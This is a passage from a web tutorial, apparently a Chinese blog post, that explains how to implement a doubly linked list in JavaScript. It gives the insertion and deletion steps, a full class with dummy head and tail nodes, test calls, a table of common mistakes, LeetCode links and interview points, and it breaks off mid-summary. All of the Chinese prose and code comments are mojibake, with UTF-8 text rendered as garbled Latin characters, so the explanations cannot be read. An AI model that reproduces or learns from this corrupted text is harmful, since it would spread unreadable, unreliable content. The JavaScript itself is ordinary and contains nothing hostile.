<li>æ–°èŠ‚ç‚¹ï¼š<code>prev</code>æŒ‡å‘åŸå°¾èŠ‚ç‚¹ï¼Œ<code>next</code>æŒ‡å‘<code>dummyTail</code></li>
<li>åŸå°¾èŠ‚ç‚¹ï¼š<code>next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li><code>dummyTail</code>ï¼š<code>prev</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
</ul>
</li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtIndex(index, val)</code>ï¼šæŒ‡å®šä½ç½®æ’å…¥</p>
<ol>
<li>è¾¹ç•Œå¤„ç†ï¼š<code>index &lt;= 0</code>è°ƒç”¨<code>addAtHead</code>ï¼Œ<code>index &gt; size</code>ç›´æ¥è¿”å›ï¼Œ<code>index === size</code>è°ƒç”¨<code>addAtTail</code></li>
<li>ä½¿ç”¨<code>getNode(index)</code>æ‰¾åˆ°æ’å…¥ä½ç½®çš„åç»§èŠ‚ç‚¹ï¼ˆ<code>nextNode</code>ï¼‰</li>
<li>è·å–å‰é©±èŠ‚ç‚¹ï¼ˆ<code>nextNode.prev</code>ï¼‰</li>
<li><strong>æˆå¯¹æ›´æ–°æŒ‡é’ˆ</strong>ï¼š
<ul>
<li>æ–°èŠ‚ç‚¹ï¼š<code>prev</code>æŒ‡å‘<code>prevNode</code>ï¼Œ<code>next</code>æŒ‡å‘<code>nextNode</code></li>
<li><code>prevNode</code>ï¼š<code>next</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
<li><code>nextNode</code>ï¼š<code>prev</code>æŒ‡å‘æ–°èŠ‚ç‚¹</li>
</ul>
</li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>ç¬¬äº”æ­¥ï¼šå®ç°åˆ é™¤æ–¹æ³•ï¼ˆæ ¸å¿ƒä¼˜åŠ¿ï¼šO(1)åˆ é™¤ï¼‰</strong></p>
<ul>
<li><code>deleteAtIndex(index)</code>ï¼šåˆ é™¤æŒ‡å®šä½ç½®èŠ‚ç‚¹
<ol>
<li>è¾¹ç•Œæ ¡éªŒï¼šä½¿ç”¨<code>getNode(index)</code>è·å–å¾…åˆ é™¤èŠ‚ç‚¹ï¼Œæ— æ•ˆåˆ™è¿”å›</li>
<li><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šç›´æ¥è·å–å‰é©±ï¼ˆ<code>nodeToDel.prev</code>ï¼‰å’Œåç»§ï¼ˆ<code>nodeToDel.next</code>ï¼‰ï¼Œæ— éœ€éå†</li>
<li><strong>æˆå¯¹æ›´æ–°æŒ‡é’ˆ</strong>ï¼š
<ul>
<li>å‰é©±èŠ‚ç‚¹ï¼š<code>next</code>æŒ‡å‘åç»§èŠ‚ç‚¹</li>
<li>åç»§èŠ‚ç‚¹ï¼š<code>prev</code>æŒ‡å‘å‰é©±èŠ‚ç‚¹</li>
<li>å¾…åˆ é™¤èŠ‚ç‚¹ï¼š<code>prev</code>å’Œ<code>next</code>ç½®ä¸º<code>null</code>ï¼ˆé‡Šæ”¾å¼•ç”¨ï¼‰</li>
</ul>
</li>
<li>æ›´æ–°<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>ç¬¬å…­æ­¥ï¼šå®ç°æ‰©å±•åŠŸèƒ½ï¼ˆåŒé“¾è¡¨ç‰¹æœ‰ï¼‰</strong></p>
<ul>
<li><code>reverseTraverse()</code>ï¼šé€†åºéå†
<ol>
<li>ä»<code>dummyTail.prev</code>å¼€å§‹</li>
<li>é€šè¿‡<code>prev</code>æŒ‡é’ˆå‘å‰éå†</li>
<li>ç›´åˆ°<code>dummyHead</code>ç»“æŸ</li>
</ol>
</li>
</ul>
<p><strong>å…³é”®è®¾è®¡è¦ç‚¹ï¼ˆç›¸æ¯”å•é“¾è¡¨çš„å‡çº§ï¼‰ï¼š</strong></p>
<ul>
<li>âœ… <strong>åŒæŒ‡é’ˆç»´æŠ¤</strong>ï¼šæ¯ä¸ªèŠ‚ç‚¹çš„<code>prev</code>å’Œ<code>next</code>å¿…é¡»æˆå¯¹æ›´æ–°</li>
<li>âœ… <strong>è™šæ‹Ÿå¤´+è™šæ‹Ÿå°¾</strong>ï¼šå½»åº•ç»Ÿä¸€è¾¹ç•Œå¤„ç†ï¼Œæ— éœ€ç»´æŠ¤<code>tail</code>æŒ‡é’ˆ</li>
<li>âœ… <strong>O(1)åˆ é™¤ä¼˜åŠ¿</strong>ï¼šåˆ é™¤ä»»æ„èŠ‚ç‚¹æ— éœ€éå†æ‰¾å‰é©±</li>
<li>âœ… <strong>åŒå‘éå†ä¼˜åŒ–</strong>ï¼šæ ¹æ®ç´¢å¼•ä½ç½®é€‰æ‹©éå†æ–¹å‘ï¼ˆä¼˜åŒ–æŸ¥æ‰¾æ•ˆç‡ï¼‰</li>
<li>âœ… <strong>æŒ‡é’ˆé‡Šæ”¾</strong>ï¼šåˆ é™¤èŠ‚ç‚¹åå¿…é¡»å°†<code>prev</code>å’Œ<code>next</code>ç½®ä¸º<code>null</code></li>
</ul>
<h4 data-id="heading-12">2. åŒé“¾è¡¨å®Œæ•´å®ç°</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * åŒé“¾è¡¨èŠ‚ç‚¹ç±»
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - èŠ‚ç‚¹å­˜å‚¨çš„å€¼
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DoublyLinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;       <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// æŒ‡å‘å‰é©±èŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// æŒ‡å‘åç»§èŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
  }
}

<span class="hljs-comment">/**
 * åŒå‘é“¾è¡¨å®ç°ï¼ˆä¼˜åŒ–ç‰ˆï¼šè™šæ‹Ÿå¤´+è™šæ‹Ÿå°¾ï¼‰
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDoublyLinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(<span class="hljs-string">'_dummyHead'</span>); <span class="hljs-comment">// è™šæ‹Ÿå¤´èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(<span class="hljs-string">'_dummyTail'</span>); <span class="hljs-comment">// è™šæ‹Ÿå°¾èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;                                       <span class="hljs-comment">// é“¾è¡¨é•¿åº¦</span>

    <span class="hljs-comment">// åˆå§‹åŒ–ï¼šè™šæ‹Ÿå¤´çš„nextæŒ‡å‘è™šæ‹Ÿå°¾ï¼Œè™šæ‹Ÿå°¾çš„prevæŒ‡å‘è™šæ‹Ÿå¤´</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-comment">// çº¦æŸï¼šçœŸå®èŠ‚ç‚¹å§‹ç»ˆåœ¨dummyHeadå’ŒdummyTailä¹‹é—´</span>
  }

  <span class="hljs-comment">/**
   * åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>}
   */</span>
  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">/**
   * è¾…åŠ©æ–¹æ³•ï¼šæ ¹æ®ç´¢å¼•æ‰¾åˆ°å¯¹åº”èŠ‚ç‚¹ï¼ˆä¼˜åŒ–ï¼šåˆ¤æ–­ç´¢å¼•ä½ç½®ï¼Œé€‰æ‹©ä»å¤´/å°¾éå†ï¼‰
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - ç›®æ ‡ç´¢å¼•
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">DoublyLinkedNode|null</span>} æ‰¾åˆ°çš„èŠ‚ç‚¹/ç´¢å¼•æ— æ•ˆè¿”å›null
   */</span>
  <span class="hljs-title function_">getNode</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">let</span> current;
    <span class="hljs-comment">// ä¼˜åŒ–ï¼šç´¢å¼•åœ¨å‰åŠæ®µï¼Œä»å¤´éå†ï¼›ç´¢å¼•åœ¨ååŠæ®µï¼Œä»å°¾éå†</span>
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> / <span class="hljs-number">2</span>) {
      current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
        current = current.<span class="hljs-property">next</span>;
      }
    } <span class="hljs-keyword">else</span> {
      current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>; i &gt; index; i--) {
        current = current.<span class="hljs-property">prev</span>;
      }
    }
    <span class="hljs-keyword">return</span> current;
  }

  <span class="hljs-comment">/**
   * è·å–æŒ‡å®šç´¢å¼•çš„èŠ‚ç‚¹å€¼
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - ç›®æ ‡ç´¢å¼•
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} èŠ‚ç‚¹å€¼ï¼Œç´¢å¼•æ— æ•ˆè¿”å›-1
   */</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">const</span> node = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">return</span> node ? node.<span class="hljs-property">val</span> : -<span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">/**
   * å¤´éƒ¨æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtHead</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);
    <span class="hljs-keyword">const</span> nextNode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>; <span class="hljs-comment">// è™šæ‹Ÿå¤´çš„åç»§èŠ‚ç‚¹ï¼ˆåŸçœŸå®å¤´ï¼‰</span>

    <span class="hljs-comment">// æ­¥éª¤1ï¼šæ–°èŠ‚ç‚¹çš„prevæŒ‡å‘è™šæ‹Ÿå¤´ï¼ŒnextæŒ‡å‘åŸçœŸå®å¤´</span>
    newNode.<span class="hljs-property">prev</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    newNode.<span class="hljs-property">next</span> = nextNode;

    <span class="hljs-comment">// æ­¥éª¤2ï¼šåŸçœŸå®å¤´çš„prevæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    nextNode.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-comment">// æ­¥éª¤3ï¼šè™šæ‹Ÿå¤´çš„nextæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// é•¿åº¦+1</span>
  }

  <span class="hljs-comment">/**
   * å°¾éƒ¨æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtTail</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);
    <span class="hljs-keyword">const</span> prevNode = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>; <span class="hljs-comment">// è™šæ‹Ÿå°¾çš„å‰é©±èŠ‚ç‚¹ï¼ˆåŸçœŸå®å°¾ï¼‰</span>

    <span class="hljs-comment">// æ­¥éª¤1ï¼šæ–°èŠ‚ç‚¹çš„prevæŒ‡å‘åŸçœŸå®å°¾ï¼ŒnextæŒ‡å‘è™šæ‹Ÿå°¾</span>
    newNode.<span class="hljs-property">prev</span> = prevNode;
    newNode.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>;

    <span class="hljs-comment">// æ­¥éª¤2ï¼šåŸçœŸå®å°¾çš„nextæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    prevNode.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// æ­¥éª¤3ï¼šè™šæ‹Ÿå°¾çš„prevæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// é•¿åº¦+1</span>
  }

  <span class="hljs-comment">/**
   * æŒ‡å®šç´¢å¼•æ’å…¥èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - æ’å…¥ä½ç½®
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - è¦æ’å…¥çš„å€¼
   */</span>
  <span class="hljs-title function_">addAtIndex</span>(<span class="hljs-params">index, val</span>) {
    <span class="hljs-comment">// è¾¹ç•Œå¤„ç†ï¼šindex&lt;=0æ’å¤´éƒ¨ï¼Œindex&gt;sizeä¸æ’å…¥</span>
    <span class="hljs-keyword">if</span> (index &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// index===size æ’å°¾éƒ¨</span>
    <span class="hljs-keyword">if</span> (index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtTail</span>(val);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// æ‰¾åˆ°æ’å…¥ä½ç½®çš„ç›®æ ‡èŠ‚ç‚¹ï¼ˆæ–°èŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹ï¼‰</span>
    <span class="hljs-keyword">const</span> nextNode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">const</span> prevNode = nextNode.<span class="hljs-property">prev</span>; <span class="hljs-comment">// ç›®æ ‡èŠ‚ç‚¹çš„å‰é©±ï¼ˆæ–°èŠ‚ç‚¹çš„å‰é©±ï¼‰</span>
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoublyLinkedNode</span>(val);

    <span class="hljs-comment">// æ­¥éª¤1ï¼šæ–°èŠ‚ç‚¹çš„prevæŒ‡å‘prevNodeï¼ŒnextæŒ‡å‘nextNode</span>
    newNode.<span class="hljs-property">prev</span> = prevNode;
    newNode.<span class="hljs-property">next</span> = nextNode;

    <span class="hljs-comment">// æ­¥éª¤2ï¼šprevNodeçš„nextæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    prevNode.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// æ­¥éª¤3ï¼šnextNodeçš„prevæŒ‡å‘æ–°èŠ‚ç‚¹</span>
    nextNode.<span class="hljs-property">prev</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++; <span class="hljs-comment">// é•¿åº¦+1</span>
  }

  <span class="hljs-comment">/**
   * åˆ é™¤æŒ‡å®šç´¢å¼•èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - è¦åˆ é™¤çš„ç´¢å¼•
   */</span>
  <span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">const</span> nodeToDel = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getNode</span>(index);
    <span class="hljs-keyword">if</span> (!nodeToDel) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// ç´¢å¼•æ— æ•ˆç›´æ¥è¿”å›</span>

    <span class="hljs-comment">// æ­¥éª¤1ï¼šè·å–å¾…åˆ é™¤èŠ‚ç‚¹çš„å‰é©±å’Œåç»§</span>
    <span class="hljs-keyword">const</span> prevNode = nodeToDel.<span class="hljs-property">prev</span>;
    <span class="hljs-keyword">const</span> nextNode = nodeToDel.<span class="hljs-property">next</span>;

    <span class="hljs-comment">// æ­¥éª¤2ï¼šè·³è¿‡å¾…åˆ é™¤èŠ‚ç‚¹ï¼Œè¿æ¥å‰é©±å’Œåç»§</span>
    prevNode.<span class="hljs-property">next</span> = nextNode;
    nextNode.<span class="hljs-property">prev</span> = prevNode;

    <span class="hljs-comment">// æ­¥éª¤3ï¼šé‡Šæ”¾å¾…åˆ é™¤èŠ‚ç‚¹çš„æŒ‡é’ˆï¼ˆé¿å…å†…å­˜æ³„æ¼ï¼‰</span>
    nodeToDel.<span class="hljs-property">prev</span> = <span class="hljs-literal">null</span>;
    nodeToDel.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--; <span class="hljs-comment">// é•¿åº¦-1</span>
  }

  <span class="hljs-comment">/**
   * æ‰©å±•æ–¹æ³•ï¼šé€†åºéå†é“¾è¡¨ï¼ˆåŒé“¾è¡¨æ ¸å¿ƒä¼˜åŠ¿ï¼‰
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number[]</span>} é€†åºçš„èŠ‚ç‚¹å€¼æ•°ç»„
   */</span>
  <span class="hljs-title function_">reverseTraverse</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> result = [];
    <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyTail</span>.<span class="hljs-property">prev</span>; <span class="hljs-comment">// ä»è™šæ‹Ÿå°¾çš„å‰é©±å¼€å§‹éå†</span>
    <span class="hljs-keyword">while</span> (current !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>) {
      result.<span class="hljs-title function_">push</span>(current.<span class="hljs-property">val</span>);
      current = current.<span class="hljs-property">prev</span>;
    }
    <span class="hljs-keyword">return</span> result;
  }
}

<span class="hljs-comment">// åŒé“¾è¡¨æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-keyword">const</span> doublyList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDoublyLinkedList</span>();
doublyList.<span class="hljs-title function_">addAtHead</span>(<span class="hljs-number">1</span>);
doublyList.<span class="hljs-title function_">addAtTail</span>(<span class="hljs-number">3</span>);
doublyList.<span class="hljs-title function_">addAtIndex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŒé“¾è¡¨get(1):"</span>, doublyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// è¾“å‡º2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŒé“¾è¡¨é€†åºéå†:"</span>, doublyList.<span class="hljs-title function_">reverseTraverse</span>()); <span class="hljs-comment">// è¾“å‡º[3,2,1]</span>
doublyList.<span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŒé“¾è¡¨get(1):"</span>, doublyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// è¾“å‡º3</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŒé“¾è¡¨é€†åºéå†:"</span>, doublyList.<span class="hljs-title function_">reverseTraverse</span>()); <span class="hljs-comment">// è¾“å‡º[3,1]</span>
</code></pre>
<h4 data-id="heading-13">3. åŒé“¾è¡¨æ ¸å¿ƒæ˜“é”™ç‚¹</h4>



































<table><thead><tr><th>æ˜“é”™ç‚¹</th><th>é”™è¯¯è¡¨ç°</th><th>ä¿®å¤æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>æŒ‡é’ˆæ›´æ–°é¡ºåºé”™è¯¯</strong></td><td>å…ˆä¿®æ”¹åŸé“¾è¡¨æŒ‡é’ˆï¼Œå¯¼è‡´æ–°èŠ‚ç‚¹æŒ‡é’ˆä¸¢å¤±</td><td>å…ˆæ›´æ–°æ–°èŠ‚ç‚¹çš„<code>prev/next</code>ï¼Œå†ä¿®æ”¹åŸé“¾è¡¨çš„æŒ‡é’ˆï¼ˆå…ˆè¿åæ–­ï¼‰</td></tr><tr><td><strong>è™šæ‹Ÿå¤´å°¾æœªåˆå§‹åŒ–</strong></td><td><code>dummyHead.next</code>/<code>dummyTail.prev</code>ä¸ºnullï¼Œæ“ä½œæ—¶æŠ¥é”™</td><td>åˆå§‹åŒ–æ—¶å¿…é¡»è®©<code>dummyHead.next = dummyTail</code>ã€<code>dummyTail.prev = dummyHead</code></td></tr><tr><td><strong>éå†æ–¹å‘é€‰æ‹©ä¸å½“</strong></td><td>æ— è®ºç´¢å¼•ä½ç½®éƒ½ä»å¤´éå†ï¼Œæ•ˆç‡ä½</td><td>åˆ¤æ–­ç´¢å¼•æ˜¯å¦å°äº<code>size/2</code>ï¼Œé€‰æ‹©ä»å¤´/å°¾éå†ï¼ˆä¼˜åŒ–æ—¶é—´å¤æ‚åº¦ï¼‰</td></tr><tr><td><strong>ä»…æ›´æ–°å•å‘æŒ‡é’ˆ</strong></td><td>åªæ›´æ–°<code>next</code>ä¸æ›´æ–°<code>prev</code>ï¼Œå¯¼è‡´é“¾è¡¨æ–­è£‚</td><td>æ’å…¥/åˆ é™¤æ—¶ï¼Œ<code>prev</code>å’Œ<code>next</code>å¿…é¡»æˆå¯¹æ›´æ–°</td></tr><tr><td><strong>æœªé‡Šæ”¾åˆ é™¤èŠ‚ç‚¹çš„æŒ‡é’ˆ</strong></td><td>èŠ‚ç‚¹åˆ é™¤åä»æœ‰<code>prev/next</code>å¼•ç”¨ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ï¼ˆJSä¸­å½±å“å°ï¼Œä½†ä¸è§„èŒƒï¼‰</td><td>åˆ é™¤åå°†èŠ‚ç‚¹çš„<code>prev/next</code>ç½®ä¸ºnull</td></tr></tbody></table>
<h3 data-id="heading-14">å››ã€å®æˆ˜åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-15">1. LeetCode ç»å…¸é¢˜ç›®</h4>
<ul>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fdesign-linked-list%2F" target="_blank" title="https://leetcode.cn/problems/design-linked-list/" ref="nofollow noopener noreferrer">707. è®¾è®¡é“¾è¡¨</a></strong>ï¼šå•é“¾è¡¨/åŒé“¾è¡¨çš„åŸºç¡€å®ç°</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Freverse-linked-list%2F" target="_blank" title="https://leetcode.cn/problems/reverse-linked-list/" ref="nofollow noopener noreferrer">206. åè½¬é“¾è¡¨</a></strong>ï¼šå•é“¾è¡¨æŒ‡é’ˆæ“ä½œ</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Freverse-linked-list-ii%2F" target="_blank" title="https://leetcode.cn/problems/reverse-linked-list-ii/" ref="nofollow noopener noreferrer">92. åè½¬é“¾è¡¨ II</a></strong>ï¼šéƒ¨åˆ†åè½¬ï¼Œéœ€è¦å®šä½å‰åèŠ‚ç‚¹</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flinked-list-cycle%2F" target="_blank" title="https://leetcode.cn/problems/linked-list-cycle/" ref="nofollow noopener noreferrer">141. ç¯å½¢é“¾è¡¨</a></strong>ï¼šå¿«æ…¢æŒ‡é’ˆæŠ€å·§</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flinked-list-cycle-ii%2F" target="_blank" title="https://leetcode.cn/problems/linked-list-cycle-ii/" ref="nofollow noopener noreferrer">142. ç¯å½¢é“¾è¡¨ II</a></strong>ï¼šæ‰¾ç¯å…¥å£</li>
<li><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flru-cache%2F" target="_blank" title="https://leetcode.cn/problems/lru-cache/" ref="nofollow noopener noreferrer">146. LRU ç¼“å­˜</a></strong>ï¼šåŒé“¾è¡¨ + å“ˆå¸Œè¡¨ï¼ˆç»å…¸åº”ç”¨ï¼‰</li>
</ul>
<h4 data-id="heading-16">2. å®é™…åº”ç”¨åœºæ™¯</h4>
<ul>
<li><strong>LRUç¼“å­˜</strong>ï¼šä½¿ç”¨åŒé“¾è¡¨ç»´æŠ¤è®¿é—®é¡ºåºï¼ŒO(1)æ—¶é—´åˆ é™¤ä»»æ„èŠ‚ç‚¹</li>
<li><strong>æµè§ˆå™¨å†å²è®°å½•</strong>ï¼šåŒé“¾è¡¨æ”¯æŒå‰è¿›/åé€€æ“ä½œ</li>
<li><strong>æ’¤é”€/é‡åšåŠŸèƒ½</strong>ï¼šåŒé“¾è¡¨ç»´æŠ¤æ“ä½œå†å²</li>
<li><strong>éŸ³ä¹æ’­æ”¾åˆ—è¡¨</strong>ï¼šå•é“¾è¡¨å®ç°é¡ºåºæ’­æ”¾</li>
<li><strong>ä»»åŠ¡é˜Ÿåˆ—</strong>ï¼šå•é“¾è¡¨å®ç°FIFOé˜Ÿåˆ—</li>
</ul>
<h4 data-id="heading-17">3. é¢è¯•é«˜é¢‘è€ƒç‚¹</h4>
<ol>
<li><strong>æŒ‡é’ˆæ“ä½œ</strong>ï¼šå¦‚ä½•æ­£ç¡®æ›´æ–°<code>next</code>/<code>prev</code>æŒ‡é’ˆ</li>
<li><strong>è¾¹ç•Œå¤„ç†</strong>ï¼šç©ºé“¾è¡¨ã€å•èŠ‚ç‚¹ã€å¤´å°¾èŠ‚ç‚¹çš„ç‰¹æ®Šå¤„ç†</li>
<li><strong>çŠ¶æ€åŒæ­¥</strong>ï¼š<code>size</code>ã€<code>tail</code>ç­‰çŠ¶æ€çš„ç»´æŠ¤</li>
<li><strong>æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–</strong>ï¼šåŒé“¾è¡¨çš„åˆ é™¤ä¼˜åŠ¿ã€è™šæ‹ŸèŠ‚ç‚¹çš„ä½œç”¨</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šæŒ‡é’ˆé‡Šæ”¾ã€é¿å…å†…å­˜æ³„æ¼</li>
</ol>
<h3 data-id="heading-18">äº”ã€æ€»ç»“</h3>
<h4 data-id="heading-19">1. å•é“¾è¡¨æ ¸å¿ƒ</h4>
<ul>
<li>
<p>æ ¸å¿ƒå±æ€§ï¼š<code>dummyHead</code>ï¼ˆè™šæ‹Ÿå¤´ï¼‰+ <code>tail</code>ï¼ˆå°¾èŠ‚ç‚¹ï¼‰+ <code>size</code>ï¼ˆé•¿åº¦ï¼‰ï¼›</p>
</li>
<li>
<p>ä¿®å¤å…³é”®ï¼š<code>size</code>ä¸<code>tail</code>åŒæ­¥æ›´æ–°ï¼Œå¯¹<code>null</code>æ•æ„Ÿæ“ä½œå¢åŠ å…œåº•æ ¡éªŒï¼›</p>
</li>
<li>
